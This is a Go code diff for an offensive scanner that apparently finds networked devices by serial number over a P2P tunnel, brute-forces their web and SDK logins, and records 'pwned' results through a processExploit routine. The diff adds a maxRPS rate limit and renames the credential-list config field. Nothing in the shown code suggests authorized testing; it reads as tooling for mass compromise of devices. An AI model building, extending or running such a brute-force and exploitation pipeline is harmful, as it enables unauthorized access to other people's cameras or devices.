@@ -78,6 +78,14 @@ func (s *Scanner) connectTimeout() time.Duration {
 	return time.Duration(timeoutMs) * time.Millisecond
 }
 
+// online check rate ceiling
+func (s *Scanner) maxRPS() int {
+	if val, err := getIntValue(s.Config.Scan.MaxRPS); err == nil && val > 0 {
+		return val
+	}
+	return 0
+}
+
 func (s *Scanner) Run() {
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
@@ -166,7 +174,7 @@ func (s *Scanner) Run() {
 		}()
 	}
 
-	pipe, err := p2p.NewCheckPipe(nurses, s.cancelChan)
+	pipe, err := p2p.NewCheckPipe(nurses, s.cancelChan, s.maxRPS())
 	if err != nil {
 		scanRed.Printf("[!] %s\n", err)
 		return
@@ -309,12 +317,12 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 				return
 			}
 
-			if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Credentials) > 0 {
+			if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Creds) > 0 {
 				type1Delay := 0
 				if val, err := getIntValue(s.Config.Brute.Type1.Delay); err == nil && val > 0 {
 					type1Delay = val
 				}
-				for idx, cred := range s.Config.Brute.Credentials {
+				for idx, cred := range s.Config.Brute.Creds {
 					if type1Delay > 0 && idx > 0 {
 						select {
 						case <-s.cancelChan:
@@ -586,7 +594,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 
 		if s.Config.Pwn.Methods["brute"] {
-			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Credentials, serial)
+			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Creds, serial)
 			if err == nil && res != nil {
 				s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
 				return true
@@ -596,7 +604,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 	} else if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
 		// 2. SDK Brute (only executed if CGI protocol is disabled)
-		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials, serial)
+		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Creds, serial)
 		if err == nil && res != nil {
 			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
 			return true
